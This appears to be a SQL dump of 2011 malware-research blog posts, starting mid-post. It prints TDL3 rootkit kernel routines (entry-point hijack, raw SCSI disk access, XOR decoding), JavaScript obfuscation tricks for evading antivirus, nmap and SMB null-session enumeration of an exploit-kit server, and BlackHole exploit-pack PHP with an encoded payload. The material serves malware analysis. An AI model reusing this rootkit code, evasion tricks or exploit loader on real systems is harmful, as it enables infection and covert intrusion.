pwAddress--;}    while(pwAddress!=0);  return 0; }[3] Filesystem Change RoutineThis is specific routine utilized by TDL3 rootkit to initiate a file system filter which uses a callback function in order to provide notification to main TDL3 driver about the state of file system being registered or unregistered as an active file system. The \"RtlImageNtHeader\" returns handle to PIMAGE_NT_HEADERS and \"RtlOffsetToPointer\"  returns a pointer to the offset from a specific base address. Generally, the process characteristics are checked (primarily address) when a driver is initiated to notify about the change in the file system registration.NTSTATUS TDLEntry(PDRIVER_OBJECT pdoDriver,PUNICODE_STRING pusRegistry){PTDL_START ptsStart;PIMAGE_NT_HEADERS pinhHeader;GET_TDL_ADDRESSES->pdoDeviceDisk=(PDEVICE_OBJECT)pusRegistry;pinhHeader=(PIMAGE_NT_HEADERS)RtlImageNtHeader(pdoDriver->DriverStart);ptsStart=(PTDL_START)RtlOffsetToPointer(pdoDriver->DriverStart,pinhHeader->OptionalHeader.AddressOfEntryPoint+TDL_START_SIZE-sizeof(TDL_START));GET_TDL_ADDRESSES->ullFSOffset=ptsStart->ullDriverCodeOffset; pinhHeader->OptionalHeader.AddressOfEntryPoint=(DWORD)(DWORD_PTR)ptsStart->pdiOEP; pinhHeader->OptionalHeader.CheckSum=ptsStart->dwCheckSum;pinhHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size=ptsStart->dwSectionSecuritySize; pinhHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress=ptsStart->dwSectionSecurityVirtualAddress;GetEPNameOffset();*GET_TDL_ADDRESSES->cBotID=0;if(!NT_SUCCESS(Reinitialize(0,FALSE))){IoRegisterFsRegistrationChange(GET_TDL_ADDRESSES->pdoDriver,ADDRESS_DELTA(PDRIVER_FS_NOTIFICATION,Reinitialize)); } return STATUS_SUCCESS;}[4] Decrypting Data RoutineA simple XOR based algorithm is used for decryption. Looks like for decrypting the raw data from the system or during execution.PVOID Unxor(PVOID pvData,DWORD dwSize,BYTE bKey){ DWORD dwData;for(dwData=0; dwData lt; dwSize;dwData++){ ((PBYTE)pvData)[dwData]^=dwData+bKey;}return pvData;};[5] Small Computer System Interface (SCSI) Command RoutineTDL3 rootkit uses SCSI command routine to connect and transferring data between various peripheral devices which includes hard disks, scanners, usb etc. Since SCSI command interface is implemented as a part of device driver, TDL3 rootkit potentially exploits the command set provided by SCSI interface. The basic aim is to infect peripheral devices when these are attached to system, TDL3 rootkit device driver detects the device and sends initiates a communication routine in order to send commands to that device. This is implemented using \"SCSI_REQUEST_BLOCK\" structure in which \"SRB_FUNCTION_EXECUTE_SCSI\" flag is passed as value to the member function in order to execute the request on the logical device. Another flag \"SRB_FLAGS_DISABLE_AUTOSENSE\" is used to disable the request-send information should not be returned back.TDL3 rootkit also uses \"IoAllocateIrp\" in order to create IRP (I/O Request Packet) to communicate with low level drivers. \"PIO_STACK_LOCATION\" structure is used which is an entry in the I/O stack that is associated with each IRP (created by IoAllocateIrp). \"IoGetNextIrpStackLocation\" is sued to walk down the stack for accessing next low leveld river associated with same IRP (created before). TDL3 rootkit implement it as followsNTSTATUS SCSICmd(PDEVICE_OBJECT pdoDevice,PDRIVER_DISPATCH pddDispatch,BYTE bOpCode,BYTE bDataIn,PVOID pvBuffer,DWORD dwBufferSize,DWORD dwAddress){ SCSI_REQUEST_BLOCK srbBuffer; SENSE_DATA sdData; IO_STATUS_BLOCK iosbStatus; KEVENT keEvent; PIRP piIrp; PMDL pmMdl; PIO_STACK_LOCATION pislStack; memset(&srbBuffer,0,sizeof(srbBuffer)); memset(&sdData,0,sizeof(sdData)); srbBuffer.Length=sizeof(srbBuffer); srbBuffer.Function=SRB_FUNCTION_EXECUTE_SCSI; srbBuffer.QueueAction=SRB_FLAGS_DISABLE_AUTOSENSE; srbBuffer.CdbLength=CDB10GENERIC_LENGTH; srbBuffer.SenseInfoBufferLength=sizeof(sdData); srbBuffer.SenseInfoBuffer=&sdData; srbBuffer.DataTransferLength=dwBufferSize; srbBuffer.DataBuffer=pvBuffer; srbBuffer.TimeOutValue=5000; srbBuffer.QueueSortKey=dwAddress; srbBuffer.SrbFlags=bDataIn|SRB_FLAGS_DISABLE_AUTOSENSE; srbBuffer.Cdb[0]=bOpCode; srbBuffer.Cdb[2]=(BYTE)((dwAddress&0xff000000)>>24);  srbBuffer.Cdb[3]=(BYTE)((dwAddress&0xff0000)>>16);  srbBuffer.Cdb[4]=(BYTE)((dwAddress&0xff00)>>8);  srbBuffer.Cdb[5]=(BYTE)(dwAddress&0xff); if(dwAddress!=0) {  DWORD dwSectors;  dwSectors=dwBufferSize/0x200;  srbBuffer.Cdb[7]=(BYTE)((dwSectors&0xff00)>>8);  srbBuffer.Cdb[8]=(BYTE)(dwSectors&0xff); } KeInitializeEvent(&keEvent,NotificationEvent,FALSE); piIrp=IoAllocateIrp(pdoDevice->StackSize,FALSE); if(piIrp!=0) {  // Allocate Memory  pmMdl=IoAllocateMdl(pvBuffer,dwBufferSize,0,0,piIrp);  srbBuffer.OriginalRequest=piIrp;  piIrp->MdlAddress=pmMdl;  MmProbeAndLockPages(pmMdl,KernelMode,IoModifyAccess);  piIrp->UserIosb=&iosbStatus;  piIrp->UserEvent=&keEvent;  piIrp->Flags=IRP_SYNCHRONOUS_API|IRP_NOCACHE;  piIrp->Tail.Overlay.Thread=KeGetCurrentThread();  pislStack=IoGetNextIrpStackLocation(piIrp);  pislStack->DeviceObject=pdoDevice;  pislStack->MajorFunction=IRP_MJ_SCSI;  pislStack->Parameters.Scsi.Srb=&srbBuffer;  piIrp->CurrentLocation--;  pislStack=IoGetNextIrpStackLocation(piIrp);  piIrp->Tail.Overlay.CurrentStackLocation=pislStack;  pislStack->DeviceObject=pdoDevice;  // Callback Function..  if(pddDispatch(pdoDevice,piIrp)==STATUS_PENDING)  {   KeWaitForSingleObject(&keEvent,Executive,KernelMode,FALSE,0);  }  return iosbStatus.Status; } return STATUS_INSUFFICIENT_RESOURCES;}[6] Computing PE ChecksumTDL3 rootkit also computes the checksum of the required portable executable as followsDWORD PEChecksum(PVOID pvData,DWORD dwSize,WORD wChecksum){DWORD dwBytes=dwSize;while(dwBytes>0){ if(HIWORD((DWORD)wChecksum+(DWORD)*(PWORD)pvData)!=0){wChecksum++;}wChecksum+=*(PWORD)pvData;dwBytes-=sizeof(WORD);pvData=MAKE_PTR(pvData,sizeof(WORD),PVOID);}return wChecksum+dwSize;}Hashing module is also implemented as follows__declspec(noinline) DWORD HashString(PCHAR pcString){DWORD dwResult=0;while(*pcString!=0){ dwResult=(0x1003f*dwResult)+(DWORD)(*((PWORD)pcString++));}return dwResult;}This discussion will be continued in the next post.', '', 'https://secniche.blogspot.com/2011/04/tdl3-rootkit-implicit-analysis-part-1.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (85, '\nJavaScript Camouflaging - A Primer\n', 'Aditya K Sood', '2011-04-11T15:28:00-07:00', 'In this discussion, we are simply walking through the nature of JavaScript obfuscation and camouflaging in order to understand the importance of dense code.Views By:- RB and AKSJavaScript is a widely used language for developing application and websites on internet. JavaScript is used for positive as well as for nefarious purposes. Since it is a client side scripting language, most of the time the scripts are available for walking through them to understand the purpose. However, JavaScript obfuscation is used heavily for making JavaScript readability a hard process and at the same time beating automated detection tools. Overall, the purpose of JavaScript obfuscation is to hide the source code so that it is not possible to steal it. At the same time, this technique is also used for malicious purposes by the attacker to bypass antivirus engines in order to execute rogue code successfully. These are the two main reasons for the wide usage of JavaScript obfuscation.Exploit Placement and Detection:Most of the Browser Exploit Packs (BEP\'s) use browser JavaScript rendering engine and heap spraying techniques to exploit vulnerabilities in browser. The aim is to exploit the heaps using JavaScript capabilities. Another thing that should be taken into account is the way exploit is developed and the way it is supported by JavaScript obfuscation. Consider an exploit; if it is wrapped and placed in [HTML] and [Body] tags, the antivirus engine definitely detects it. Is there a difference between handling scripts and executables by antivirus engines? Based on our analysis, antivirus engines follow a similar approach which is signature based pattern matching. A unique signature is created for antivirus engine and it is matched against the malicious script. If we talk about polymorphic code which carries self decrypting routine to reverse the script automatically, detection is not an easy process. However, for normal scripts the detection mechanism is easy. Considering the capabilities of JavaScript, being a client side language , it can be forced to execute scrambled code.Camouflaging - Dense CodeCamouflaging (increasing data density) is a very robust approach of making JavaScript’s undetectable. The critical functions such as EVAL/ENESCAPE are something that antivirus engines always look for. Primarily, UNESCAPE is used for making a readable string out of escaped data. The unescaped string is harder to read from user perspective but antivirus engines possibly detect this and flag it as malicious. Another similar functions is EVAL, which is used collectively with UNESCAPE to design malicious scripts. For generic JavaScript obfuscation these are used but it is executed as EVAL(UNESCAPE(............)) in the code and combination is easily fetched as malicious. The question is these functions are required explicitly to run the code in hidden manner. Camouflaging is an art that is used by referencing these functions to different names or completely random names. A generic example isas followsvar FGHTY678 = eval;var VFGBH432 = unescape;These variables can be generated dynamically because JavaScript supports on the fly variable referencing. For hard scenarios, a robust algorithm can be structured which provides random naming of variables that points to crucial functions. We will stick to our generic examples. At this point if we use the code as follows it is still not that hard to detect by antivirus enginesvar VFGBH432 = unescape;return FGHTY678(VFGBH432(....))It performs the similar functionality except we can make variable names random. This process changes the signature and it makes the process tough for antivirus engines to detect it (cannot say purely undetectable). Another case which is easily detectable is as followsfunction FGHTY678(FGATH789) { return eval(FGATH789);}function VFGBH432(XCVTH789) { return unescape(XCVTH789);}Only variable names are changed but function calls remain intact and hence signature detection is easy. The above discussed points do not provide reliable way of obfuscation. One must remember that even if we have camouflaged the function calls, the escaped code is still present as argument in the UNESCAPE function. It is readable by the antivirus engines. Overall, the code is not fully camouflaged and obfuscated. Now let\'s talk about hexadecimal encoding (you can choose anyone). The question is, \"How the hexadecimal encoding impacts the obfuscation?\". For example: if we encode the following string \"JavaScript Obfuscation\", the hexadecimal looks like as\"4a617661536372697074204f62667573636174696f6e\"Even though for humans, it is hard to read but for computer programs it is not a big deal. Can we use JavaScript to make it more obfuscated? Yes, there are certain inbuilt string manipulation functions that we can try on. JavaScript functionality can be used to design extensible and robust codes. Mere simple encoding does not hide the signatures. JavaScript functions like REPLACE is of much use.  This function is used heavily in normal purposes because of its versatile nature. for example: a relative code can be structured asvar GHJKO786 = eval;var KJLHM890 = unescape;var FGHBN345 = \"JavaScript-Obfuscation1JavaScript-Obfuscation2JavaScript-Obfuscation3JavaScript-Obfuscation4JavaScript-Obfuscation5JavaScript-Obfuscation6JavaScript-Obfuscation7\";KJLHM890.replace(/JavaScript-Obfuscation/gi,\"!@#$%^&*\");GHJKO786(KJLHM890(FGHBN345));The above stated code looks rigorous but it is using inbuilt JavaScript functions.\"JavaScript-Obfuscation\" is replaced with a metacharacter string \"!@#$%^&*\". The \"gi\" option in REPLACE function is used to replace the string case sensitive and it is applied as global level. Further, it is also possible to use MATH.ROUND and MATH.RANDOM functions to randomize the custom function names.Garbage Data ManglingGarbage data serves useful with extra logic is used to place raw data in JavaScript code. The main idea behind this technique is to make the process harder for filtering actual data. Generally, it is of no use and it is not vital. This helps in resisting the signature matching process. We basically talk about logic flow in which certain logic remain true forever and scripts are placed inside that logic which execute all the time.  A similar example can be used as followsvar GHJKO786 = eval;var KJLHM890 = unescape;if (VBNHJ789 != \"7890\"){FGHBN345 = \"JavaScript-Obfuscation1JavaScript-Obfuscation2JavaScript-Obfuscation3JavaScript-Obfuscation4JavaScript-Obfuscation5JavaScript-Obfuscation6JavaScript-Obfuscation7\";}var KJLHM890.replace(/JavaScript-Obfuscation/gi,\"!@#$%^&*\");GHJKO786(KJLHM890(FGHBN345));In reality, the logic (VBNHJ789 != \"7890\") is never true and hence FGHBN345 string is always true and viceversa. another example can be discussed as function RTGHY123{var FGHYU009 = \"Rocky\";for (temp =1 ; temp <= 20 ; temp++) {  FJKLM765 = document.write;}if(FGHYU009 == 5678) { FJKLM765(\"HEYA\");}}The function RTGHY123 is a garbage function and does nothing but results in creating mess for the analysts and anybody.At last, there are several other methods possible for obfuscation. Our sole purpose is to discuss the effectiveness of density in encoding mechanism in JavaScript that can be used to design better obfuscator. Nothing is impossible until it is proclaimed so.', '', 'https://secniche.blogspot.com/2011/04/javascript-camouflaging-primer.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (86, '\nHacking Free Bird - SMB - Phoenix EP 2.5\n', 'Aditya K Sood', '2011-04-06T11:40:00-07:00', 'Recently, we came across Phoenix Exploit Pack 2.5 which has included number of new Java and other exploits. We detected the hidden iframe as\r\r[iframe src=\"http://phoenix_host/phx/index.php\" width=\"1\" height=\"1\" frameborder=\"0\"][/iframe]\r\rAs we know, JAVA SMB is one of the most exploited vulnerability in the recent times. In the last POST, we talked about exploit obfuscation in BlackHole exploit pack. However, it has been analyzed that both exploit packs use similar name  \"new.avi\" for the successful execution of the Java SMB exploit. Further, newer versions of the Phoenix exploit pack 2.5 includes other Java exploits as JAVA RMI, JAVA MIDI and JAVA SKYLINE\r\rWe have analyzed certain number of domains that used to host SMB servers which is required to trigger the Java SMB exploit appropriately. However, SMB server has to be open to the world in order to execute the exploit. It can be hosted on the same domain as of Phoenix exploit pack or it can be on different domain. During the course of this analysis, we found number of vulnerable or insecure SMB servers which were serving SMB exploit file new.avi. Securing SMB server is typically a hard task if one does not understand configuration in a right manner (script kiddies etc). We ran nmap Decoy scan in a stealth manner to check the presence of RPC SMB port 445 \r\rnmap -P0 -A -T4 -sS phoenix_host -D 112.123.124.111 -p 445\rStarting Nmap 5.51 ( http://nmap.org ) at 2011-04-06 13:07 Eastern Daylight Time\rPORT    STATE SERVICE     VERSION\r445/tcp open  netbios-ssn Samba smbd 3.X  \r Running: Linux 2.6.X\rOS details: Linux 2.6.17 - 2.6.35\rNetwork Distance: 1 hop\rHost script results:\r|_nbstat: NetBIOS name: VMWARE-VIRTUAL-, NetBIOS user: , NetBIOS MAC: \r|_smbv2-enabled: Server doesn\'t support SMBv2 protocol\r| smb-os-discovery:\r|   OS: Unix (Samba 3.5.4)\r|   Name: Unknown\\Unknown\r|_  System time: 2011-04-06 13:11:10 UTC-7\r\rWe found that phoenix host is actually running port 445. On continuous monitoring, we analyzed that SMB server was hosted on the domain serving Phoenix exploit pack. Since the port was in open state, we verified random access from our virtual machine running Win XP SP3 as follows:\r\rE:\\audit>net use \\\\phoenix_host\\IPC$ /user:root\rThe command completed successfully.\r\rE:\\audit>net use \\\\phoenix_host\\IPC$ /user:AAAAAAAA\rThe command completed successfully.\r\rE:\\audit>net use \\\\phoenix_host\\IPC$ /user:guest\rThe command completed successfully.\r\rE:\\audit>net use \\\\phoenix_host\\IPC$ /user:XXXX\rThe command completed successfully.\r\rThis shows that default access was allowed on SMB server which was running in shared mode security. However, no user mode security is applied. In general, this can be made more restricted and shares can be accessed without querying the SMB server in default mode. Here we used, random names and all were allowed access to IPC$ which was quite rogue. We tried to get some information and was successful in getting userlist, password policy information and share list etc\r\rE:\\audit>enum -P phoenix_host\rserver:  phoenix_host\rsetting up session... success.\rpassword policy:\r  min length: 5 chars\r  min age: none\r  max age: none\r  lockout threshold: none\r  lockout duration: 30 mins\r  lockout reset: 30 mins\rcleaning up... success.\r\rE:\\audit>enum -S phoenix_host\rserver: phoenix_host\rconnected as Chimera\\Administrator, disconnecting... success.\rsetting up session... success.\renumerating shares (pass 1)... got 1 shares, 0 left:\r  IPC$\rcleaning up... success.\r\rE:\\audit>enum -U phoenix_host\rserver: phoenix_host\rsetting up session... success.\rgetting user list (pass 1, index 0)... success, got 2.\r  rocky  root\rcleaning up... success.\r\r\rAt this point of time we found that there were no shares enumerated. This gave us an impression that share serving \"new.avi\" file was not \"browseable\". We took a look around , search over the internet and used simple combinatorial SMB URI\'s for accessing share as\r\r\\\\phoenix_host\\home\\new.avi\r\\\\phoenix_host\\usr\\new.avi\r\\\\phoenix_host\\home\\smb\\new.avi\r\\\\phoenix_host\\usr\\smb\\new.avi\r\\\\....\r......\r\rThe connection in the bold worked well for us. When we used that link from our virtual machine, we got positive response as follows\r\rE:\\audit>net use \\\\phoenix_host\\smb\rThe command completed successfully.\r\rURI:(\\\\phoenix_host\\home\\smb\\new.avi) directly included exploit file in the target victim system and started running the exploit file. The file was accessed through firefox as\r\r\r\rWe reversed the process. We tried to define the parameters in smb.conf file used by the vulnerable server and we cam across following settings\r\r[global]\r  security = share\r[smb]\r  comment = smb\r  path = /home/smb\r  public = yes\r  browseable = no\r  writeable = no\r  guest ok = yes\r\rAt last, we succeeded in cracking the login account for SMB users for getting access to the server. One can also use Metasploit in order to query and run auxillary modules on SMB server.\r\rThis analysis shows that, it is possible to hack in the BEP\'s successfully. Try your hands on, we are sure you will hack the free bird.', '', 'https://secniche.blogspot.com/2011/04/hacking-free-bird-smb-phoenix-ep-25.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (87, '\nISACA Journal -  Social Network Malware\n', 'Aditya K Sood', '2011-02-24T08:58:00-08:00', 'ISACA Journal - Chain Exploitation - Social Network Malware        View more documents', '', 'https://secniche.blogspot.com/2011/02/isaca-journal-chain-exploitation-social.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (88, '\nJava OBE + BlackHole - Dead Man Rising\n', 'Aditya K Sood', '2011-02-21T10:34:00-08:00', 'BlackHole exploit pack is showing heavy increase in malware infections across web. The interesting fact that BlackHole presents is the use of Java OBE (Open Business Engine) in spreading exploits and successfully loading the malicious executable in the victim machine.What is OBE?:\"OBE is a flexible, modular, standards-compliant Open Source Java workflow engine. It is fully J2EE compliant, and supports several J2EE application servers, operating systems and databases. It faithfully implements Workflow Management Coalition Open Standards (WfMC), to which it offers a variety of extensions and enhancements. OBE is equally suited to embedded or standalone deployment.\"More details can be found hereHowever, BlackHole is using fully functional Java OBE Toolkit in order to exploit plethora of systems. Our latest analysis unleash this point that Java OBE holds the maximum rate of successfully exploiting the targets. BlackHole exploit pack shows this behavior where Java OBE Toolkit is devastating victim machines at rapid pace than any other exploits.The exploit served by Java OBE is the CVE-2010-0840  and CVE-2010-0842 As stated by  Zero Day Initiative: Authentication is not required to exploit this vulnerability.The specific flaw exists within the code responsible for ensuring proper privileged execution of methods. If an untrusted method in an applet attempts to call a method that requires privileges,Java will walk the call stack and for each entry verify that the method called is defined within a class that has that privilege.BlackHole exploit pack uses following PHP code to link to the exploit?php  include_once \'config.php\';  echo \' Applet Code=\"ToolsDemo.class\" archive=\"\';  echo $config_url . \'/exploits/Java-2010-0842.jar\';  echo \'\" width=\"0\" Height=\"1\"  PARAM NAME=\"URL\" VALUETYPE=\"ref\" VALUE=\"\';  echo $config_url . \'/exploits/Java-2010-0842Helper.php\';  echo \'\">  /applet>\';?Th exploit is encodes with PHP IonCube encoder as follows?php //0035eif(!extension_loaded(\'ionCube Loader\')){$__oc=strtolower(substr(php_uname(),0,3));$__ln=\'/ioncube/ioncube_loader_\'.$__oc.\'_\'.substr(phpversion(),0,3).(($__oc==\'win\')?\'.dll\':\'.so\');$__oid=$__id=realpath(ini_get(\'extension_dir\'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==\':\'){$__id=str_replace(\'\\\\\',\'/\',substr($__id,2));$__here=str_replace(\'\\\\\',\'/\',substr($__here,2));}$__rd=str_repeat(\'/..\',substr_count($__id,\'/\')).$__here.\'/\';$__i=strlen($__rd);while($__i--){if($__rd[$__i]==\'/\'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}@dl($__ln);}else{die(\'The file \'.__FILE__.\" is corrupted.\\n\");}if(function_exists(\'_il_exec\')){return _il_exec();}echo(\'Site error: the file \'.__FILE__.\' requires the ionCube PHP Loader \'.basename($__ln).\' to be installed by the site administrator.\');exit(199);?>4+oV54zQTAi0e4oDtExXY1DjnASpODJTLQWezUOr9eSc/QY6HTb4vd+rZpF1HHTh0Khql7iEBD8oiHXqZlUSsNYne9MWqG5vGyPF8ndLDo/Ctc2nWyKPRPmYovkVWIhmzruI9fbg2mVjfc84zaSvSFuNzXKHmSbl+AoJo6UChrvdCB8b2wQEepAhplIZW1fEX5jdI73K0aILHly7rmYA0DxVC7IIG81zhT37quMA5arzCs3LYUshSwjHlbWT63Un0It0T59cuYZxSlhY3osq1fqGxeAlzJ/8gMXCr8bMvhQ00VcEsLkaLKgxBf9elSC4pPQ8yN4Ajtbk63NI1k/VPoN8c1bogVgD81STXlMlcnXV/BhsGcj0EcM4nRavtwLKKBIHXDqgVWQOpFvlhumeM9KLQu6bbOuZYYos/tOsCLyRauiChV8vQdWndia8XGK7bjoc9vriRwDG5R4I+LYhp1ajtvbfoWafYMD+tJcMtwn+GGkNDWEa8SDhrYc5foPERsptZDbduKlXIfmuKHMsi3iBo4o9ncsSSRIm2EwrrqG9GoWRfOeTMaCQFKHMrRH3xK+GTe9sMDLsC3bWMfeU1/js8nAMshnJuD3JEvPvENBByeVjawcuITCXUi7us4RQ7xlPaUgQ5zn8KleXH30qErLCyu1+imafdPVFbvhyj0B6owIoTC0eVD2/qF2A5MMQOJ86uSyn+TU7zL39Xak43NVE8K7pFi+PSYPqXKMFPu4gZuNy97fZxnJuX5nENhyhotklpg3Qt9yabDVdSDSDFZyV4BHH17w5uAj7eEj7uupXU0JlnYccdhU1O65Ncy2lhUjWJSC4a36ucKA/xgssB+JqZ3AUZjdH4Jwn89HfexDfcN9tkBDQ9KcWVJJ3hm+HYvW98yc3pOkYOb8S2HG1AqKLoe7Hs5F3IQT5gS2Vy4iZjVNMj6ZHrpFZ7PNg/Bmhs11Ihz7MBk3uqdamXcSNzb4DvTIN7pGIMBaMw84Px89GKeKJFJz9xGk5RPtIJehUf7xm64zbGJNyA5XkStpph7OF0eXL6vKTUnEuvwWVsK0qf/ssfSdC9C5bABVnxZRi6Ehf4Ss7pizy8U417HVSeaYHrFUGtnUifK41MkJMBH7TlccNm7fP0yAslR7TMtcjkTD9RC1LjjfTTLocpsYSH2pKSVaa/MqMr0jPyafCZrv5qkwlgWOlKvlUDwussRUpp7bP6MsCw7bCVFHg5S5fjb/W9AxdK9H51aNeotbWAj6ht/wodBNqG/mN9MmB9ejBWC3HnrXTHwkIR6jKOIbHEk3d1A50RjL0L93EtCVUaJv2GpIyYsKIsWNuc00JdXifz4vvKttF1S929jzbaWq7wAykuHu3SmmjBkQ+wDLIR6ghdwCVspTpbb6IiFYWYKjhFmxeOsQ2tuieEG6CRMbm0hZsuwwUrrtKEZ5rJaQqtN2zSVpAXfQMYf/vACAZdbdroX17DgDLDWz/lpWSTGbQlCPteycgmgNn9J3PAkSkXwY81PNU0WBSbxSP6s80Q4lye1IbFfltV/Doyw5HFR+vF+vGUzcepkPif58TruwNlFt4jFuj/6+SosDV4xn9wnYf+KjWw95keiR5zBaFd194ens3GdmLibpooN4=This exploit can be found in the wild on the World Wide Web. During our analysis, exploit specific stats are checked for the infected domain hosting BlackHole exploit pack. The comparative ratio is presented below This scenario shows the ease of exploiting Java open engine.In this, only BlackHole exploit pack is analyzed, what about other exploit packs. It seems like Java is becoming the preferred base for exploitation because of platform independent nature.', '', 'https://secniche.blogspot.com/2011/02/java-obe-tookit-exploits-blackhole-dead.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (89, '\nBrowserCheck - Malware Driven Retrospective\n', 'Aditya K Sood', '2011-02-19T16:37:00-08:00', 'Recently, we came across the new browser security tool released by QUALYS termed as BrowserCheck . In general, this tool scrutinizes and verifies the state of plug-ins in Mozilla browser. As stated in the information week article   \"Less-than-current browser and plug-in versions can leave your browsing unnecessarily vulnerable to web-based attacks... and make latest-and-greatest-based web sites harder or impossible to use, but Qualys\' free BrowserCheck can help.\"Well, in general the tool is designed as a simple version based signature tool. However, the tool uses a PHP based version verifier script that runs on server side. An appropriate XMLHttpRequest is used to send the browser based information which we termed as User Agent Based Fingerprinting (UABF). Conversely, this technique is used in the wild by all the classes of malware to detect the state of browsers (version, addons, plug-ins etc). Apart from this, malware is served based on the type of version running.  A similar plug-in detection script can be compiled using navigator object asFurther, it is also detected that the tool is using JavaScript + XMLHTTPRequest collectively to find the information from client machine. During the course of testing, we conducted a small test in order to scrutinize whether Java applet is loaded in the system or not in order to verify the semantics of tool. Generally, Java plug-in version can be checked by using a simple Java applet as followsimport java.applet.*; import java.awt.*; public class JavaVersionDisplayApplet extends Applet { private Label m_labVersionVendor;    public JavaVersionDisplayApplet() //constructor   {      m_labVersionVendor = new Label (\" Java Version: \" +                                    System.getProperty(\"java.version\")+                           \" from \"+System.getProperty(\"java.vendor\"));     this.add(m_labVersionVendor);   } }The Java client side environment is not triggered on the test machine which clearly indicates that fingerprinting is done using simple tactics. While running the tool on one of our test bed machines, we found that the data is transferred as{\"ScanInfo\":  {\"Platform\":\"Microsoft Windows Vista Home Premium Edition, 64-bit Service Pack 2\",\"Browser\":\"Mozilla Firefox                   3.6.13\",\"AgentVer\":\"1.1.95.1\",\"SADllVer\":\"1.1.95.1\",\"InstanceId\":\"72904d0d-a58e-409d-afa3-922d1c8a71cd\",\"ScanId\":\"5\"},\"ScanResults\":[{\"Status\":\"Up To Date\",\"ItemType\":\"Browser\",\"ItemName\":\"Mozilla Firefox\",\"FoundVer\":\"3.6.13\",\"ProductVer\":\"3.6.13\",\"RequiredVer\":\"3.6.13.0\",\"FixInfo\":\"http://www.mozilla.com/en-US/firefox/upgrade.html\"},{\"Status\":\"Up To Date\",\"ItemType\":\"Browser Extra\",\"ItemName\":\"Adobe Flash Player\",\"FoundVer\":\"10.2.152.26\",\"InstalledFile\":\"c:\\\\windows\\\\syswow64\\\\macromed\\\\flash \\npswf32.dll\",\"ProductVer\":\"10.2.152.26\",\"RequiredVer\":\"10.2.152.26\",\"AdvisoryUrl\":\"http://www.adobe.com/support/security/advisories/apsa10-05.html\",\"AddonType\":\"Plugin\",\"FixInfo\":\"http://fpdownload.adobe.com/get/flashplayer/current/install_flash_player.exe\"},{\"Status\":\"Up To Date\",\"ItemType\":\"Browser Extra\",\"ItemName\":\"Adobe Reader\",\"FoundVer\":\"10.0.1.434\",\"InstalledFile\":\"c:\\\\program files (x86)\\\\adobe\\\\reader 10.0\\\\reader\\\\browser \\\\nppdf32.dll\",\"ProductVer\":\"10.0.1.434\",\"RequiredVer\":\"10.0.1.434\",\"AddonType\":\"Plugin\",\"FixInfo\":\"http://get.adobe.com/reader\"},{\"Status\":\"Up To Date\",\"ItemType\":\"Browser Extra\",\"ItemName\":\"Java Runtime\",\"FoundVer\":\"1.6.0_22\",\"ProductVer\":\"1.6.0_22\",\"RequiredVer\":\"1.6.0_24\",\"RecommendedVer\":\"Latest Version of Java\",\"AddonType\":\"Plugin\",\"FixInfo\":\"http://www.java.com/getjava/index.jsp\"},{\"Status\":\"Up To Date\",\"ItemType\":\"Browser Extra\",\"ItemName\":\"Microsoft Silverlight\",\"FoundVer\":\"4.0.60129.0\",\"InstalledFile\":\"c:\\\\program files (x86)\\\\microsoft silverlight\\\\4.0.60129.0\\\\npctrl.dll\",\"ProductVer\":\"4.0.60129.0\",\"RequiredVer\":\"4.0.60129.0\",\"AddonType\":\"Plugin\",\"FixInfo\":\"http://www.microsoft.com/getsilverlight/handlers/getsilverlight.ashx\"},{\"Status\":\"NA\",\"ItemType\":\"Browser Extra\",\"ItemName\":\"Microsoft Windows Presentation Foundation\",\"FoundVer\":\"3.5.30729.1\",\"InstalledFile\":\"\",\"ProductVer\":\"3.5.30729.1\",\"RequiredVer\":\"3.5.30729.1\",\"AddonType\":\"Plugin\",\"FixInfo\":\"http://www.microsoft.com/downloads/\"},{\"Status\":\"Up To Date\",\"ItemType\":\"Browser Extra\",\"ItemName\":\"Microsoft Windows Media Player\",\"FoundVer\":\"11.0.6002.18311\",\"InstalledFile\":\"C:\\\\Windows\\\\system32\\\\wmp.dll\",\"ProductVer\":\"11.0.6002.18311\",\"RequiredVer\":\"11.0.6002.18311\",\"AddonType\":\"Plugin\",\"FixInfo\":\"http://www.microsoft.com/downloads/en/confirmation.aspx?familyid=277151A2-B74F-4DA6-8203-E774AF75E44C&displaylang=en\"}]}This scan info completely leverages the working stature of the tool. However, the technique is not new but one can notice that signature based tools are still widely used.The next question is to see the way this tool reacts when a malicious plug-in (having updated version information) is installed in the browser.', '', 'https://secniche.blogspot.com/2011/02/browsercheck-signatureversion-based.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (90, '\nHITB Paper - Shared Hosting Infections\n', 'Aditya K Sood', '2011-02-14T08:13:00-08:00', 'HITB issue 5 talks about our paper on \"Shared Hosting Malware Infections\". FETCH here.', '', 'https://secniche.blogspot.com/2011/02/hitb-paper-shared-hosting-infections.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (91, '\nSpyEye CreditGrab.dll Module - Plugin Analysis\n', 'Aditya K Sood', '2011-02-06T11:43:00-08:00', 'In our last post about SpyEye backend collector, we discussed about the the data transference mechanism in SpyEye botnet framework. SpyEye uses creditgrab.dll  in order take care of the data that is stolen from the requisite credit cards from victim machines. However, last time we talked about the source code analysis. In order to support the  point, we recently came across the dynamic link libraries for different modules. In this post, we are going to talk about the creditgrab.dll.The DLL main function is designed as followsAt first part, Credit Grab Module (CGM) is designed to get the bot information with a guid reference. This bot guid is used to keep a track of the infection occur in the victim machine and the requisite credit card information stolen from that machine. The code snippet presented below shows this factThe function \"TakeBotGuid\" is used in conjunction with the CGM. In this particular function, bot guid is checked. The \"repne scasb\" instruction keep on checking the string for NULL terminated value there by decrementing the counter (dec ecx). If the carry 